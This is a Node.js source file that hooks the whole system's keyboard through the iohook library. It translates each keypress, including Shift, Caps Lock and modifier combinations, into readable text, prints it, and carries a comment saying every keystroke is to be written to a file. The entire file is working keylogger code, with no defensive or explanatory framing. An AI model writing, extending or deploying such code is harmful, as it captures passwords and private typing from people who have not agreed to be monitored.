const iohook = require('iohook');

let toggle = false;
let keymap = { "8": "backspace", "9": "tab", "13": "\n", "19": "pause_break", "20": "caps_lock", "27": "escape", "33": "page_up", "34": "page_down", "35": "end", "36": "home", "37": "left_arrow", "38": "up_arrow", "39": "right_arrow", "40": "down_arrow", "45": "insert", "46": "delete", "48": "0", "49": "1", "50": "2", "51": "3", "52": "4", "53": "5", "54": "6", "55": "7", "56": "8", "57": "9", "65": "a", "66": "b", "67": "c", "68": "d", "69": "e", "70": "f", "71": "g", "72": "h", "73": "i", "74": "j", "75": "k", "76": "l", "77": "m", "78": "n", "79": "o", "80": "p", "81": "q", "82": "r", "83": "s", "84": "t", "85": "u", "86": "v", "87": "w", "88": "x", "89": "y", "90": "z", "91": "left_window_key", "92": "right_window_key", "93": "select_key", "96": "numpad_0", "97": "numpad_1", "98": "numpad_2", "99": "numpad_3", "100": "numpad_4", "101": "numpad_5", "102": "numpad_6", "103": "numpad_7", "104": "numpad_8", "105": "numpad_9", "106": "multiply", "107": "add", "109": "subtract", "110": "decimal_point", "111": "divide", "112": "f1", "113": "f2", "114": "f3", "115": "f4", "116": "f5", "117": "f6", "118": "f7", "119": "f8", "120": "f9", "121": "f10", "122": "f11", "123": "f12", "144": "num_lock", "145": "scroll_lock", "186": ";", "187": "=", "188": ",", "189": "-", "190": ".", "191": "/", "192": "`", "219": "[", "220": "\\", "221": "]", "222": "'", "32": " " }
let specialchar = {"`":"~","1":"!","2":"@","3":"#","4":"$","5":"%","6":"^","7":"&","8":"*","9":"(","0":")","-":"_","=":"+","[":"{","]":"}","\\":"|",";":":","'":'"',",":"<",".":">","/":"?",}
function interpret(event) {
    if (event.rawcode == 20) {
        toggle = !toggle;
    } 
    else {
        if (event.rawcode in keymap) {
            let i = keymap[event.rawcode];
            if(event.altKey || event.ctrlKey){
                if(event.shiftKey)
                i="SHIFT+"+i;
                if(event.altKey)
                i="ALT+"+i;
                if(event.ctrlKey)
                i="CTRL+"+i;
            }
            else if(event.shiftKey && (i in specialchar)){
                i=specialchar[i]
            }
            else if (toggle ^ event.shiftKey) {
                i = i.toUpperCase();
            }
            if (i) {
                if (i.length > 1) {
                    i = (`#[[${i}]]#`);
                }
                console.log(i);
                //$$$$$$$$$$$$$$$$$$ variable 'i' is to be stored in a file without linebreak $$$$$$$$$$$$$$$$$$$$$$
            }
        }
    }
}


iohook.on('keydown', (event) => {
    interpret(event);
});

iohook.start();